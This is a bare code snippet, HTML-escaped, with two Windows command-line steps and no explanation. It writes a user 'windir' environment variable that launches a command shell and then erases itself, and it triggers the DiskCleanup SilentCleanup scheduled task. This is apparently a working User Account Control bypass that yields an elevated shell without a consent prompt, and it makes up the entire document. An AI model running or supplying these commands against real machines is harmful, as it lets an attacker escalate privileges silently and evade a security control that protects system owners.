&lt;pre&gt;&lt;code&gt;&amp;gt;reg add hkcu\Environment /v windir /d &amp;quot;cmd /K reg delete hkcu\Environment /v windir /f &amp;amp;&amp;amp; REM &amp;quot;
&amp;gt;schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
&lt;/code&gt;&lt;/pre&gt;
